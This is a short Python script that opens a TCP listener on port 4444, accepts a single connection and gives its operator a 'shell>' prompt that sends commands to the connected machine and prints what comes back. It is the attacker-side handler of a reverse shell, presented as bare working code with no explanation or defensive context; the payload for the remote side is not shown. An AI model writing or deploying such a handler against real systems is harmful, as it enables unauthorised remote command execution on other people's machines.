import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 4444))
server.listen(1)
print("[*] Listening for incoming connections on port 4444...")

client, addr = server.accept()
print(f"[+] Connection received from {addr[0]}:{addr[1]}")

while True:
    command = input("shell> ")
    if command.lower() == "exit":
        client.send(command.encode())
        break
    client.send(command.encode())
    result = client.recv(4096).decode()
    print(result)

client.close()
server.close()
